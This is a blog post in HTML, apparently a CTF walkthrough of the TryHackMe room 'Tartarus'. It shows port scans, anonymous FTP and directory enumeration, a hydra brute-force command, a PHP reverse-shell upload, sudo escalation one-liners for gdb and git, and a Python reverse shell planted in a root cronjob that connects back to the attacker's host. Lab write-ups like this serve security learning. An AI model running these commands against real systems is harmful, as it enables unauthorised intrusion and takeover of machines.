@@ -1,0 +1,258 @@
+<!DOCTYPE html> <html lang=" en "><head> <meta charset="utf-8" /> <title> Writeup - THM - Tartarus -Phil Malle </title> <meta http-equip="X-UA-Compatible" content="IE=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1" /> <meta name="description" content="Walkthrough of Tartarus of TryHackme.- Writeup - THM - Tartarus"> <meta name="keywords" content="Writeup - THM - Tartarus, Phil Malle, walkthroughs,tryhackeme, tartarus, hacking, pwned, nmap, gobuster, cronjob"/> <link rel="alternate" type="application/rss+xml" title="RSS" href="/feed.xml" /> <meta content="" property="fb:app_id" /> <meta content="Phil Malle" property="og:site_name" /> <meta content="Writeup - THM - Tartarus" property="og:title" /> <meta content="article" property="og:type" /> <meta content="Walkthrough of Tartarus of TryHackme." property="og:description" /> <meta content="/blog/tartarus/" property="og:url" /> <meta content="2020-10-27T23:14:00+00:00" property="article:published_time" /> <meta content="/about/" property="article:author" /> <meta content="walkthroughs" property="article:section" /> <!-- Twitter Cards --> <meta name="twitter:card" content="summary" /> <meta name="twitter:site" content="@" /> <meta name="twitter:creator" content="@" /> <meta name="twitter:title" content="Writeup - THM - Tartarus" /> <meta name="twitter:url" content="/blog/tartarus/" /> <meta name="twitter:description" content="Walkthrough of Tartarus of TryHackme." /> <link rel="stylesheet" href="/assets/css/main.css" /> <!-- <link rel="stylesheet" href="/assets/css/custom-style.css" /> --> <link rel="stylesheet" href="/assets/bower_components/lightgallery/dist/css/lightgallery.min.css" /> <link rel="stylesheet" href="https://cdn.snipcart.com/themes/v3.0.0-beta.3/default/snipcart.css" /> <link rel="stylesheet" href="/assets/bower_components/bootstrap/dist/css/bootstrap.min.css" /> <link rel="stylesheet" href="/assets/bower_components/font-awesome/web-fonts-with-css/css/fontawesome-all.min.css" /> <link rel="stylesheet" href="/assets/bower_components/icono/dist/icono.min.css" /> <!-- Fonts--> <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet" /> <!-- Favicon --> <link rel="icon" href="/assets/img/favicon.ico" type="image/gif" sizes="16x16" /> <script> var base_url = '' ; </script> <!-- Jquery --> <script src="https://code.jquery.com/jquery-3.4.1.min.js" integrity="sha384-vk5WoKIaW/vJyUAd9n/wmopsmNhiy+L2Z+SBxGYnUkunIxVxAv/UtMOhba/xskxh" crossorigin="anonymous" ></script> <!-- <script src="/assets/bower_components/jquery/dist/jquery.min.js"></script> --> <script src="/assets/bower_components/jquery.easing/jquery.easing.min.js"></script> <script src="/assets/bower_components/bootstrap/dist/js/bootstrap.bundle.min.js"></script> <script src="/assets/bower_components/jquery-mousewheel/jquery.mousewheel.min.js"></script> <script src="/assets/bower_components/ghosthunter/dist/jquery.ghostHunter.min.js"></script> <script src="/assets/bower_components/lightgallery/dist/js/lightgallery-all.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/picturefill/3.0.2/picturefill.min.js"></script> <script src="/assets/bower_components/imagesloaded/imagesloaded.pkgd.min.js"></script> <script src="/assets/bower_components/nanobar/nanobar.min.js"></script> <script src="/assets/bower_components/typewrite/dist/typewrite.min.js"></script> <script src="/assets/js/search.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.20.1/moment.min.js"></script> <script src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script> <!-- for Mathjax support --> <script type="text/x-mathjax-config"> MathJax.Hub.Config({ TeX: { equationNumbers: { autoNumber: "AMS" } } }); </script> <script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> <!-- Github Button --> <script async defer src="https://buttons.github.io/buttons.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous" ></script> <!-- (you can remove the below scripts but do buy me a coffee to show some support :) --> <!-- buy me a coffeee --> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="philmalle" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="right" data-x_margin="10" data-y_margin="10" ></script> <!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--> <!--[if IE 7]> <html class="no-js lt-ie9 lt-ie8"> <![endif]--> <!--[if IE 8]> <html class="no-js lt-ie9"> <![endif]--> <!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]--> </head> <body> <nav class="navbar navbar-expand-lg fixed-top navbar-dark" id="topNav"> <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation" > <span class="icono-hamburger" id="navbar-hamburger"> </span> </button> <a class="navbar-brand" href="/">Phil Malle</a> <div class="collapse navbar-collapse" id="navbarNav"> <ul class="navbar-nav"> <li class="nav-item"> <a class="nav-link" href="/about" >About Me</a > </li> <li class="nav-item"> <a class="nav-link" href="/gallery" >Achievements</a > </li> <li class="nav-item"> <a class="nav-link" href="/blog" >Blog</a > </li> <li class="nav-item"> <a class="nav-link" href="/contact" >Contact</a > </li> <li class="nav-item"> <a class="nav-link" href="/links" >Links</a > </li> <li class="nav-item"> <a class="nav-link" href="/pgp" >GNUPG-Public Key</a > </li> </ul> </div> <ul class="nav justify-content-end"> <li class="nav-item"> <a class="nav-link toggle-search-button" href="#search"> <i class="fa fa-search search-icon" aria-hidden="true"></i> </a> </li> <li class="nav-item"> <input class="nav-link switch" id="theme-toggle" onclick="modeSwitcher() " type="checkbox" name="checkbox" /> </li> </ul> </nav> <!-- Search Form --> <div class="search-form-container"> <form class="search-form"> <fieldset class="search-form__fieldset"> <div class="row"> <div class="col-lg-8 offset-md-2"> <input class="search-form__field" placeholder="Type to Search..." autofocus> <input class="search-form__submit" type="submit" value="search"> </div> </div> </fieldset> </form> <div class="row"> <div class="col-lg-8 offset-md-2 search-results"> <div class="card search-results"></div> </div> </div> <div class="close-search-button search-form-container__close"> <i class="fa fa-times icon"></i> </div> </div> <div class="container"> <div class="row justify-content-center" id="blog-post-container"> <div class="col-lg-10"><article class="card" itemscope itemtype="http://schema.org/BlogPosting"> <div class="card-header"> <h1 class="post-title" itemprop="name headline">Writeup - THM - Tartarus</h1> <h4 class="post-meta">Walkthrough of Tartarus of TryHackme.</h4> <p class="post-summary"> Posted by : <span itemprop="author" itemscope itemtype="http://schema.org/Person"> <span itemprop="name"><a href="/blog/authors/fr3akazo1d">fr3akazo1d</a></span> </span > at <time datetime="2020-10-27 23:14:00 +0000" itemprop="datePublished" >Oct 27, 2020</time > </p> <span class="disqus-comment-count" data-disqus-identifier="/blog/tartarus/" ></span> <div class="post-categories"> Category : <a href="/blog/categories/walkthroughs" >walkthroughs</a > </div> </div> <div class="card-body" itemprop="articleBody"> <center> <img src="" alt="" /></center> <br /> <br /> <h1 id="general-information">General Information</h1> <table> <thead> <tr> <th>Room</th> <th>Date</th> <th>Difficulty</th> <th>Tags</th> <th>Time</th> </tr> </thead> <tbody> <tr> <td>Tartarus</td> <td>25.10.2020</td> <td>Easy</td> <td>Security, ctf, dirbuster, tartarus</td> <td>2h</td> </tr> </tbody> </table> <h1 id="used-programs">Used Programs</h1> <table> <thead> <tr> <th>Program</th> <th>Command</th> </tr> </thead> <tbody> <tr> <td>namp</td> <td>nmap -sC -sV -oN nmap/initial</td> </tr> <tr> <td>rustscan</td> <td>rustscan $ip –ulimit 5000 – -sC -sV -oN nmap/initial tee output</td> </tr> <tr> <td>gobuster</td> <td>gobuster dir -u http://10.10.213.137 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</td> </tr> <tr> <td>dirsearch</td> <td>python /git/dirsearch/dirsearch.py -u 10.10.213.137 -e php,html</td> </tr> <tr> <td>ftp</td> <td>ftp 10.10.213.137</td> </tr> <tr> <td>Burp-Suite</td> <td>GUI</td> </tr> <tr> <td>hydra</td> <td>hydra -l e##x -P c#########s.txt 10.10.213.137 http-post-form “/s##########t/a##########e.php:username=^USER^&amp;password=^PASS^&amp;Login:Incorrect password! “</td> </tr> <tr> <td>pwncat</td> <td>ppwncat –config /git/pwncat/data/pwncatrc -p 9910 -l</td> </tr> </tbody> </table> <h2 id="rustscan-output">Rustscan-Output</h2> <p>The first step is always to run a network scan on the Target. For the last weeks i am using Rustscan. This is a very fast Network-Scanner. He Scans all the ports and then made a nmap scan on the open ports.</p> <p>Below the Output of the rustscan.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     _____           _    _____
+    |  __ <span class="se">\ </span>        | |  / ____|
+    | |__<span class="o">)</span> |   _ ___| |_| <span class="o">(</span>___   ___ __ _ _ __
+    |  _  / | | / __| __|<span class="se">\_</span>__ <span class="se">\ </span>/ __/ _<span class="sb">`</span> | <span class="s1">'_ \
+    | | \ \ |_| \__ \ |_ ____) | (_| (_| | | | |
+    |_|  \_\__,_|___/\__|_____/ \___\__,_|_| |_|
+    Faster nmap scanning with rust.
+
+Automatically upping ulimit to 5000
+Open 22
+Open 21
+Open 80
+Starting nmap.
+The Nmap command to be run is -sC -sV -oN nmap/initial -vvv -Pn -p 22,21,80 10.10.213.137
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-10-25 22:12 CET
+NSE: Loaded 153 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 22:12
+Completed NSE at 22:12, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 22:12
+Completed NSE at 22:12, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 22:12
+Completed NSE at 22:12, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 22:12
+Completed Parallel DNS resolution of 1 host. at 22:12, 0.07s elapsed
+DNS resolution of 1 IPs took 0.07s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan at 22:12
+Scanning 10.10.213.137 [3 ports]
+Discovered open port 22/tcp on 10.10.213.137
+Discovered open port 21/tcp on 10.10.213.137
+Discovered open port 80/tcp on 10.10.213.137
+Completed Connect Scan at 22:12, 0.06s elapsed (3 total ports)
+Initiating Service scan at 22:12
+Scanning 3 services on 10.10.213.137
+Completed Service scan at 22:12, 6.45s elapsed (3 services on 1 host)
+NSE: Script scanning 10.10.213.137.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 22:12
+NSE: [ftp-bounce 10.10.213.137:21] PORT response: 500 Illegal PORT command.
+Completed NSE at 22:12, 2.58s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 22:12
+Completed NSE at 22:12, 0.52s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 22:12
+Completed NSE at 22:12, 0.00s elapsed
+Nmap scan report for 10.10.213.137
+Host is up, received user-set (0.062s latency).
+Scanned at 2020-10-25 22:12:42 CET for 9s
+
+PORT   STATE SERVICE REASON  VERSION
+21/tcp open  ftp     syn-ack vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.9.170.39
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDZdORUZHg9RjrmmXa0kKVVlArZPd+zITEEkyYL1gzvyCHE9mu9jWkpuuwZRk8lrar+exGSTNcz/9wijYrGftUA/tJZ/4WRsHTbl6taJr7UYRoCgpNy0wXC3+oC5wfIdh3Lgah4MozwRPGJ5DQE+zIIf0sVlK2T2jxFXDjuxULdWM8TPjfsBjBcu55RZ6/iBC69LRp8AtKTVCe502yaUCRKM8GbxU7zVmsSAZxUOSDyB4u8uJ+IhS7oTy9PCHLmsHg899BozsFe+LArsxloL032VDsh9ZfUFiXhj3FSze49Wk32xX4s/atQJwpCxabtCCKjTMREwEbg/7z5UU+euBsL
+|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJMh3A9yhxjDCJIcY6+SceWHxorSphXU0Jpvk8tfBkX4MsebBRvPq3SnRw5PfPLz7Nkk7xWDIcbPHsmTvMcmOLs=
+|   256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC7R6jyxhQlyAs1SlBzJnXw4dHC28Tz+uMKKiNJ6AjUp
+80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 22:12
+Completed NSE at 22:12, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 22:12
+Completed NSE at 22:12, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 22:12
+Completed NSE at 22:12, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.26 seconds
+</span></code></pre></div></div> <h2 id="enumeration-ftp">Enumeration FTP</h2> <p>Rustscan shows me that anonymous login is available on the Target.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>21/tcp open  ftp     syn-ack vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.9.170.39
+|      Logged <span class="k">in </span>as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+</code></pre></div></div> <p>Checked FTP-Server, found 2 files</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp <span class="nv">$ip</span>
+Connected to 10.10.213.137.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>10.10.213.137:fr3akazo1d<span class="o">)</span>: anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; <span class="nb">ls
+</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Here comes the directory listing.
+<span class="nt">-rw-r--r--</span>    1 ftp      ftp            17 Jul 05 21:45 test.txt
+226 Directory send OK.
+ftp&gt; get test.txt
+<span class="nb">local</span>: test.txt remote: test.txt
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Opening BINARY mode data connection <span class="k">for </span>test.txt <span class="o">(</span>17 bytes<span class="o">)</span><span class="nb">.</span>
+226 Transfer complete.
+17 bytes received <span class="k">in </span>0.00 secs <span class="o">(</span>29.2797 kB/s<span class="o">)</span>
+ftp&gt; <span class="nb">ls
+</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Here comes the directory listing.
+<span class="nt">-rw-r--r--</span>    1 ftp      ftp            17 Jul 05 21:45 test.txt
+226 Directory send OK.
+ftp&gt; <span class="nb">ls</span> <span class="nt">-la</span>
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 <span class="nb">.</span>
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 <span class="c">###</span>
+<span class="nt">-rw-r--r--</span>    1 ftp      ftp            17 Jul 05 21:45 t##t.txt
+226 Directory send OK.
+ftp&gt; <span class="nb">cd</span> <span class="c">###</span>
+250 Directory successfully changed.
+ftp&gt; <span class="nb">ls</span> <span class="nt">-la</span>
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 <span class="nb">.</span>
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
+drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 <span class="c">###</span>
+226 Directory send OK.
+ftp&gt; <span class="nb">cd</span> <span class="c">###</span>
+250 Directory successfully changed.
+ftp&gt; <span class="nb">ls
+</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Here comes the directory listing.
+<span class="nt">-rw-r--r--</span>    1 ftp      ftp            14 Jul 05 21:45 y############s.txt 
+226 Directory send OK.
+ftp&gt; get y############s.txt
+<span class="nb">local</span>: y############s.txt remote: y############s.txt
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Opening BINARY mode data connection <span class="k">for </span>y############s.txt <span class="o">(</span>14 bytes<span class="o">)</span><span class="nb">.</span>
+226 Transfer complete.
+14 bytes received <span class="k">in </span>0.04 secs <span class="o">(</span>0.3388 kB/s<span class="o">)</span>
+ftp&gt; 
+</code></pre></div></div> <p>Interessting file is y############s.txt this containts a Secret Site on the Web-Server</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bat y############s.txt.txt
+───────┬──────────────────────────────────────────────────────────────────────────
+       │ File: y############s.txt
+───────┬────────────
+───────┼──────────────────────────────────────────────────────────────────────────
+   1   │ /s###########t
+───────┴──────────────────────────────────────────────────────────────────────────
+</code></pre></div></div> <p>Web-Site is a login page. Try to Enumerate a username and a Password.</p> <p>Run dirsearch over the web-Server:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>fr3akazo1d💻fr3ak0ut<span class="o">)</span>-[~/PenetrationTesting/THM/Boxes/Tartarus]
+└─<span class="nv">$python3</span> /git/dirsearch/dirsearch.py <span class="nt">-u</span> 10.10.213.137 <span class="nt">-e</span> html,php      
+
+  _|. _ _  _  _  _ _|_    v0.4.0
+ <span class="o">(</span>_||| _<span class="o">)</span> <span class="o">(</span>/_<span class="o">(</span>_|| <span class="o">(</span>_| <span class="o">)</span>
+
+Extensions: html, php | HTTP method: GET | Threads: 20 | Wordlist size: 7507
+
+Error Log: /git/dirsearch/logs/errors-20-10-25_22-38-12.log
+
+Target: http://10.10.213.137/
+
+Output File: /git/dirsearch/reports/10.10.213.137/_20-10-25_22-38-12.txt
+
+<span class="o">[</span>22:38:12] Starting: 
+<span class="o">[</span>22:38:16] 403 -  278B  - /.htaccess.bak1
+<span class="o">[</span>22:38:16] 403 -  278B  - /.htaccess.orig
+<span class="o">[</span>22:38:16] 403 -  278B  - /.htaccess.sample
+<span class="o">[</span>22:38:16] 403 -  278B  - /.htaccess.save
+<span class="o">[</span>22:38:16] 403 -  278B  - /.htm
+<span class="o">[</span>22:38:16] 403 -  278B  - /.html
+<span class="o">[</span>22:38:16] 403 -  278B  - /.htaccessBAK
+<span class="o">[</span>22:38:16] 403 -  278B  - /.htaccessOLD
+<span class="o">[</span>22:38:16] 403 -  278B  - /.htaccessOLD2
+<span class="o">[</span>22:38:16] 403 -  278B  - /.httr-oauth
+<span class="o">[</span>22:38:17] 403 -  278B  - /.php
+<span class="o">[</span>22:38:35] 200 -   11KB - /index.html
+<span class="o">[</span>22:38:42] 200 -   83B  - /robots.txt
+<span class="o">[</span>22:38:42] 403 -  278B  - /server-status
+<span class="o">[</span>22:38:42] 403 -  278B  - /server-status/
+
+Task Completed
+</code></pre></div></div> <h2 id="checked-robotstxt">Checked Robots.txt</h2> <p>In the robots.txt file i find a hint for the next steps.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bat robots.txt                         
+───────┬──────────────────────────────────────────────────────────────────────────
+       │ File: robots.txt
+───────┼──────────────────────────────────────────────────────────────────────────
+   1   │ User-Agent: <span class="k">*</span>
+   2   │ Disallow : /a######r
+   3   │ 
+   4   │ I told d###h we should hide our things deep.
+───────┴──────────────────────────────────────────────────────────────────────────
+</code></pre></div></div> <p>In the Directory there are two files, witch are interesting.</p> <p>c#########s.txt and u####d.</p> <p>I decided to go with Burb-Suite to brute force the username and password.</p> <p>Burp-Suite was able to find a username: “e##x” Now i have the username i will check the password for the username. Also with Burp-Suite. I tried with hydra, but hydra provided me more password witch i needed. The command for hydra is in the top of the writeup.</p> <p>Burp-Suite found the Password for user: P##########4</p> <p>After the login, we are on a Upload page where we can upload files to the Web-Server.</p> <p>Testet the Upload page with a php file, to check if i can upload a php file to the webserver.</p> <p>PHP files are not blocked from the upload so i can upload the php-reverse-shell.php file from PTM.</p> <p>The file is uploaded to the folder “/images/uploads/”</p> <p>When the file was uploaded, i navigate to the upload directory and startet a listener on my target. As a listener i was going with pwncat, this was my first Room where i tried Pwncat.</p> <p>Open the shell scirpt on the target and pwncat got a reverse conneciton.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>fr3akazo1d💻fr3ak0ut<span class="o">)</span>-[~/PenetrationTesting/THM/Boxes/Tartarus]
+└─<span class="nv">$ </span>pwncat <span class="nt">--config</span> /git/pwncat/data/pwncatrc <span class="nt">-p</span> 9901 <span class="nt">-l</span>
+<span class="o">[</span>23:10:52] error: data/pwncat: no such file or directory                 set.py:96
+<span class="o">[</span>23:10:57] received connection from 10.10.213.137:55058             connect.py:255
+<span class="o">[</span>23:10:57] new host w/ <span class="nb">hash </span>7906cf3f08612e1f4824c25902d5d224         victim.py:321
+<span class="o">[</span>23:11:01] pwncat running <span class="k">in</span> /bin/sh                                                                                                                        victim.py:354
+<span class="o">[</span>23:11:02] pwncat is ready 🐈                                                                                                                               victim.py:771
+<span class="o">(</span>remote<span class="o">)</span> www-data@ubuntu-xenial:/<span class="nv">$ </span>
+<span class="o">(</span>remote<span class="o">)</span> www-data@ubuntu-xenial:/<span class="nv">$ </span>
+</code></pre></div></div> <h2 id="acess-to-target">Acess to target</h2> <p>When i got access to the target i always check if the user can run a command with sudo and no Password. When i got the shell on the Target i was the user “www-data”.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>remote<span class="o">)</span> www-data@ubuntu-xenial:/home/thirtytwo<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>www-data on ubuntu-xenial:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User www-data may run the following commands on ubuntu-xenial:
+    <span class="o">(</span>thirtytwo<span class="o">)</span> NOPASSWD: /var/www/gdb
+</code></pre></div></div> <p>The user www-data can run a command with the user thirtytwo. Now lets have a look into the gdb file witch i can run as user. gtfobins give me this.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gdb <span class="nt">-nx</span> <span class="nt">-ex</span> <span class="s1">'!sh'</span> <span class="nt">-ex</span> quit
+</code></pre></div></div> <p>I try to run the command with the user thirtytwo:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> thirtytwo /var/www/gdb <span class="nt">-nx</span> <span class="nt">-ex</span> <span class="s1">'!sh'</span> <span class="nt">-ex</span> quit
+</code></pre></div></div> <p>After running this command i’m the user Thirtytwo.</p> <p>Check again with sudo -l i can run “git” as sudo without a password. Checked again GTFOBins for some Sudo commands for git.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>remote<span class="o">)</span> thirtytwo@ubuntu-xenial:/home/thirtytwo<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>thirtytwo on ubuntu-xenial:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User thirtytwo may run the following commands on ubuntu-xenial:
+    <span class="o">(</span>d4rckh<span class="o">)</span> NOPASSWD: /usr/bin/git
+</code></pre></div></div> <p>Will try this command:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> d4rckh /usr/bin/git <span class="nt">-p</span> <span class="nb">help </span>config
+<span class="o">!</span>/bin/sh
+</code></pre></div></div> <p>now i am the user d4rckh. In the home directory there is the “user.flag” file user flag: 0#############################f</p> <p>Now i can got for the Root user.</p> <h2 id="getting-root-access">Getting Root-Access</h2> <p>Checked the user directory and found the file cleanup.py. After some enumerating, i found out that the file is running every 2 minutes as a cronjob with the user root.</p> <p>I decided to change the file, that a reverse shell will open to my client.</p> <p>used this python script:</p> <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># =*- coding: utf-8 -*-
+#!/usr/bin/env python
+</span>
+<span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">os</span>
+<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"10.9.170.39"</span><span class="p">,</span><span class="mi">9910</span><span class="p">))</span>
+<span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh -i"</span><span class="p">)</span>
+</code></pre></div></div> <p>started a listner on my machine. Pwncat got an error when the conntection should be open. then i decided to go for a standard nc listener.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> 9910
+</code></pre></div></div> <p>after 2 minutes i got a root shell and could read the root.txt file.</p> <p>root.txt:</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c">#cat root.txt</span>
+7#############################d
+</code></pre></div></div> <hr /> <h2 id="conclusion">Conclusion</h2> <p>This box was interessting. The learing was about the enumerating the user on the box and get to the root user.</p> <br /><!-- Load Facebook SDK for JavaScript --> <div id="fb-root"></div> <script> (function(d, s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js = d.createElement(s); js.id = id; js.src = "https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v3.0"; fjs.parentNode.insertBefore(js, fjs); })(document, "script", "facebook-jssdk"); </script> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8" ></script> <div class="share-page"> <p class="share-text">Share this on &rarr;</p> <a href="https://twitter.com/share?ref_src=twsrc%5Etfw" class="twitter-share-button" data-size="large" data-show-count="false" style="margin-top:5px;" >Tweet</a > <a class="fb-share-button" data-href="/blog/tartarus/" data-size="large" data-layout="button" >Share</a> </div><!-- Author box --> <div class="card"> <div class="card-header"> About Fr3akazo1d! </div> <div class="card-body"> <div class="row"> <div class="col-md-4"> <img class="author-profile-img" src="/assets/img/authors/freakazoid.png" alt="Fr3akazo1d!" /> </div> <div class="col-md-6"> <p class="author_bio">Cyber-Security Entusiast, CTF-Player</p> <p>Email : fr3akazo1d@protonmail.com</p> <p>Website : https://fr3akazo1d.github.io</p> <p class="profile-links"> <a class="social-link" href="https://github.com/fr3akazo1d" target="_blank"><i class="fab fa-github fa-fw"></i></a> </p> </div> </div> </div> </div> </div> <!-- Incomment incase you want to use Disqus <div id="disqus_thread"></div> --> </article> <script> var disqus_config = function () { this.page.url = "/blog/tartarus/"; /* Replace PAGE_URL with your page's canonical URL variable */ this.page.identifier = "/blog/thm-Tartarus-Writeup"; /* Replace 